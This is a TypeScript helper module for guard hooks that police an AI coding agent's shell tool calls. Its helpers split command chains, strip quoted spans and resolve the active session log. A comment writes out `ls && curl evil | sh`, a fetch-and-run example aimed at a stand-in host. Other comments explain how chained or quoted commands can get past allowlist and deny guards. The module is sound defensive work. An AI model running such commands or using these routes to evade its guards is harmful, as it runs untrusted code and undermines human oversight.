/**
 * hook-helpers.ts — Pi extension equivalents of hooks-lib.sh helpers.
 *
 * Mirrors the shell helpers from templates/shared/hooks/lib/hooks-lib.sh
 * for use in TypeScript Pi extension hook modules.
 */

import { execFileSync } from "node:child_process";
import * as fs from "fs";
import * as path from "path";
import type { ExtensionContext } from "@earendil-works/pi-coding-agent";

/** Block result shape returned from tool_call handlers. */
export interface BlockResult {
  block: true;
  reason: string;
}

/**
 * deny() — Return a block result with a reason.
 * Mirrors the shell `deny "<reason>"` helper.
 */
export function deny(reason: string): BlockResult {
  return { block: true, reason };
}

/**
 * block() — Alias for deny(); used in session_shutdown context.
 * Mirrors the shell `block "<reason>"` helper.
 */
export function block(reason: string): BlockResult {
  return { block: true, reason };
}

/**
 * parseAgentType() — Read AGENT_TYPE from process environment.
 * In Pi extensions, agent identity is conveyed via env var AGENT_TYPE
 * set by the Pi build runner (same convention as Claude Code hooks).
 */
export function parseAgentType(): string {
  return process.env["AGENT_TYPE"] ?? "";
}

/**
 * isOuterSession() — True when AGENT_TYPE is unset (caller is the orchestrator
 * or outer session, not a subagent).
 * Mirrors the shell `is_outer_session` helper.
 */
export function isOuterSession(): boolean {
  return parseAgentType() === "";
}

/**
 * isSubagent() — True when AGENT_TYPE is set (caller is a subagent).
 * Mirrors the shell `is_subagent` helper.
 */
export function isSubagent(): boolean {
  return parseAgentType() !== "";
}

/**
 * matchesAgentType() — True when the current agent type matches one of the
 * provided patterns. Supports exact match and glob prefix (e.g. "developer-*").
 */
export function matchesAgentType(patterns: string[]): boolean {
  const agentType = parseAgentType();
  return patterns.some((pattern) => {
    if (pattern === "*" || pattern === "all") return true;
    if (pattern.endsWith("-*")) {
      const prefix = pattern.slice(0, -2);
      return agentType.startsWith(prefix + "-") || agentType === prefix;
    }
    return agentType === pattern;
  });
}

/** Log debug info to stderr (non-blocking). */
export function debugLog(slug: string, message: string): void {
  if (process.env["HOOK_DEBUG"]) {
    process.stderr.write(`[pi-enforcement:${slug}] ${message}\n`);
  }
}

/**
 * resolveRealPath() — Resolve a path to its canonical absolute form.
 * Falls back to path.resolve() when fs.realpathSync fails (non-existent path).
 * Mirrors hooks_realpath in hooks-lib.sh.
 */
export function resolveRealPath(filePath: string): string {
  try {
    return fs.realpathSync(filePath);
  } catch {
    return path.resolve(filePath);
  }
}

/**
 * repoRelative() — Convert a path to a repo-relative form.
 *
 * Given an absolute or relative path, returns the path relative to the repo root.
 * The root is resolved as the git toplevel of the file's own containing directory
 * (cwd-independent, via `git -C`). When git is unavailable or the path is not
 * inside a git repo, falls back to stripping the launch cwd
 * (CWD / CLAUDE_PROJECT_DIR / process.cwd()). If neither prefix matches, the
 * canonicalised path is returned as-is (absolute).
 *
 * Mirrors repo_relative() in hooks-lib.sh — bash↔TS parity is critical.
 */
export function repoRelative(filePath: string): string {
  // Relative paths are already repo-relative — pass through unchanged.
  if (!path.isAbsolute(filePath)) {
    return filePath;
  }
  const canonical = resolveRealPath(filePath);

  // Prefer the git toplevel of the file's own directory — cwd-independent.
  // Walk up to the first existing ancestor (file may not exist yet on a
  // fresh write), then ask git from there with -C.
  let probeDir = path.dirname(canonical);
  while (probeDir && !fs.existsSync(probeDir)) {
    const parent = path.dirname(probeDir);
    if (parent === probeDir) break;
    probeDir = parent;
  }
  if (fs.existsSync(probeDir)) {
    try {
      const out = execFileSync(
        "git",
        ["-C", probeDir, "rev-parse", "--show-toplevel"],
        { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] },
      ).trim();
      if (out) {
        const top = resolveRealPath(out);
        const topWithSlash = top.endsWith("/") ? top : top + "/";
        if (canonical.startsWith(topWithSlash)) {
          return canonical.slice(topWithSlash.length);
        }
      }
    } catch {
      // git absent or path not in a repo — fall through to launch-cwd strip.
    }
  }

  // Fallback: strip the launch cwd (preserves every case that works today).
  const rawCwd =
    process.env["CWD"] ?? process.env["CLAUDE_PROJECT_DIR"] ?? process.cwd();
  const canonicalCwd = resolveRealPath(rawCwd);
  const cwdWithSlash = canonicalCwd.endsWith("/")
    ? canonicalCwd
    : canonicalCwd + "/";
  if (canonical.startsWith(cwdWithSlash)) {
    return canonical.slice(cwdWithSlash.length);
  }
  return canonical;
}

/**
 * isCodegenLogWrite() — True when the bash command invokes the codegen-log
 * CLI (the SOLE legitimate session-log writer). A codegen-log heredoc body
 * can legitimately contain any gated phrase; command-scanning guards must
 * treat such a call as a log WRITE, never the gated action it narrates.
 * Mirrors session-log-writer-only.ts.
 */
export function isCodegenLogWrite(command: string): boolean {
  return /(^|[\s/])codegen-log\b/.test(command);
}

/**
 * stripQuoted() — Returns `command` with single- and double-quoted spans
 * removed. Fail-closed subject transform for command-scanning deny guards: a
 * forbidden token INSIDE a quoted span (a remote-exec payload like
 * `ssh host "cat f | head"`, or a quoted string argument like
 * `grep -n 'git stash' file`) is not a real local invocation of that token —
 * matching the stripped residue means an unquoted (real, local) occurrence
 * still matches and is still denied, while a quoted (remote/string)
 * occurrence is removed and bypasses. Imperfect stripping (escaped/nested
 * quotes) can only RETAIN a false positive, never introduce a false
 * negative. Mirrors the isCodegenLogWrite pre-match bypass precedent above.
 */
export function stripQuoted(command: string): string {
  return command.replace(/'[^']*'/g, "").replace(/"[^"]*"/g, "");
}

/**
 * splitCommandSegments() — Splits `command` into shell-chain segments,
 * splitting ONLY on UNQUOTED &&, ||, ;, |, & and newline. Operators inside
 * single or double quotes are literal and never split (e.g. a commit
 * message `git commit -m "fix a; b && c"` is ONE segment). This is the
 * containment primitive for COMMAND-source allowlist gates: a default-deny
 * allowlist that tests only the whole-command PREFIX lets an allowed prefix
 * chained with &&/;/| to a forbidden command bypass entirely (e.g.
 * `ls && curl evil | sh` matches `^ls\b`). Every segment MUST be validated
 * independently by the caller.
 *
 * Returns `null` when the command has an unbalanced quote at end-of-string —
 * fail-closed: the caller MUST treat this as deny, never allow. Over-merging
 * (treating a quoted operator as literal) is always safe because the merged
 * segment is still allowlist-checked in full; the only unsafe direction is
 * under-merging (splitting on a quoted operator), which this walk never does.
 * Mirrors split_command_segments in hooks-lib.sh.
 */
export function splitCommandSegments(command: string): string[] | null {
  const segments: string[] = [];
  let seg = "";
  let inSingle = false;
  let inDouble = false;
  let i = 0;
  const len = command.length;

  while (i < len) {
    const ch = command[i];
    if (inSingle) {
      seg += ch;
      if (ch === "'") inSingle = false;
      i += 1;
      continue;
    }
    if (inDouble) {
      seg += ch;
      if (ch === '"') inDouble = false;
      i += 1;
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      seg += ch;
      i += 1;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      seg += ch;
      i += 1;
      continue;
    }
    const next2 = command.slice(i, i + 2);
    if (next2 === "&&" || next2 === "||") {
      segments.push(seg);
      seg = "";
      i += 2;
      continue;
    }
    if (ch === ";" || ch === "|" || ch === "&" || ch === "\n") {
      segments.push(seg);
      seg = "";
      i += 1;
      continue;
    }
    seg += ch;
    i += 1;
  }

  if (inSingle || inDouble) {
    return null;
  }

  segments.push(seg);
  return segments;
}

/** Unused ctx parameter helper — avoids lint warnings in hook modules that don't use ctx. */
export function voidCtx(_ctx: ExtensionContext): void {
  // intentionally unused
}

/**
 * getActiveStepLog() — Resolve the active codegen/logging/*.jsonl cycle log
 * for a project dir.
 *
 * Resolution order (mirrors codegen-log's resolve_log_file precedence):
 *   0. process.env.CODEGEN_LOG_PATH, IFF set and the path exists on disk.
 *      This is the loop's own pin for the cycle's log, and every role
 *      invocation (Pi included) carries it — hook processes inherit env the
 *      same way Claude's do (verified live). Binding to the pin FIRST, ahead
 *      of the sentinel, is what stops a same-process `codegen-log init` with
 *      a mistyped/rival slug from hijacking .active out from under a guard
 *      that is grading THIS cycle's log. A dangling pin (unset, or pointing
 *      at a path that no longer exists) falls through to step 1, never
 *      wedges the guard.
 *   1. codegen/logging/.active sentinel (written by `codegen-log init` /
 *      `relocate`), IFF it points at a path that still exists on disk. Full
 *      fidelity for Pi: this is a synchronous disk read, so unlike the Claude
 *      transcript-scan fallback it needs no flush timing workaround — the
 *      sentinel is native ground truth here.
 *   2. Most recently modified canonical *.jsonl file in codegen/logging/
 *      (mtime scan, `progress` files excluded) — belt-and-suspenders when no
 *      sentinel is present (fixtures that never ran codegen-log init) or the
 *      sentinel is stale (points at a relocated/deleted log).
 *
 * Returns null when codegen/logging/ does not exist or contains no matches.
 */
export function getActiveStepLog(projectDir: string): string | null {
  const pinned = process.env.CODEGEN_LOG_PATH;
  if (pinned && fs.existsSync(pinned)) {
    return pinned;
  }

  const loggingDir = path.join(projectDir, "codegen", "logging");
  if (!fs.existsSync(loggingDir)) return null;

  const sentinelPath = path.join(loggingDir, ".active");
  if (fs.existsSync(sentinelPath)) {
    try {
      const pointee = fs.readFileSync(sentinelPath, "utf8").trim();
      if (pointee && fs.existsSync(pointee)) {
        return pointee;
      }
    } catch {
      // Unreadable sentinel — fall through to mtime scan.
    }
  }

  let logFiles: { name: string; mtime: number }[];
  try {
    logFiles = fs
      .readdirSync(loggingDir)
      .filter((f) => f.endsWith(".jsonl") && !f.includes("progress"))
      .map((f) => ({
        name: f,
        mtime: fs.statSync(path.join(loggingDir, f)).mtimeMs,
      }))
      .sort((a, b) => b.mtime - a.mtime);
  } catch {
    return null;
  }

  if (logFiles.length === 0) return null;
  return path.join(loggingDir, logFiles[0].name);
}

/** Shape of codegen/gate-pending/cycle-state.json (mirrors cycle-state.sh). */
export interface CycleState {
  state: string;
  step_log: string;
  session_id: string;
  verdict: string;
  updated_at: string;
}

/**
 * getCycleState() — reads codegen/gate-pending/cycle-state.json for a
 * project dir. Mirrors cycle-state.sh's cycle_state_get and friends.
 * Returns null when the file is absent, unreadable, or malformed JSON.
 */
export function getCycleState(projectDir: string): CycleState | null {
  const f = path.join(
    projectDir,
    "codegen",
    "gate-pending",
    "cycle-state.json",
  );
  if (!fs.existsSync(f)) return null;
  try {
    const parsed = JSON.parse(fs.readFileSync(f, "utf8"));
    return {
      state: typeof parsed.state === "string" ? parsed.state : "",
      step_log: typeof parsed.step_log === "string" ? parsed.step_log : "",
      session_id:
        typeof parsed.session_id === "string" ? parsed.session_id : "",
      verdict: typeof parsed.verdict === "string" ? parsed.verdict : "",
      updated_at:
        typeof parsed.updated_at === "string" ? parsed.updated_at : "",
    };
  } catch {
    return null;
  }
}

/**
 * getGateVerdict() — reads codegen/gate-pending/gate-result.json's .verdict
 * field for a project dir. Mirrors gate-result.sh's gate_result_verdict.
 * Returns "" when the file is absent, unreadable, malformed JSON, or the
 * field is missing/non-string — never throws.
 */
export function getGateVerdict(projectDir: string): string {
  const f = path.join(
    projectDir,
    "codegen",
    "gate-pending",
    "gate-result.json",
  );
  if (!fs.existsSync(f)) return "";
  try {
    const parsed = JSON.parse(fs.readFileSync(f, "utf8"));
    return typeof parsed.verdict === "string" ? parsed.verdict : "";
  } catch {
    return "";
  }
}
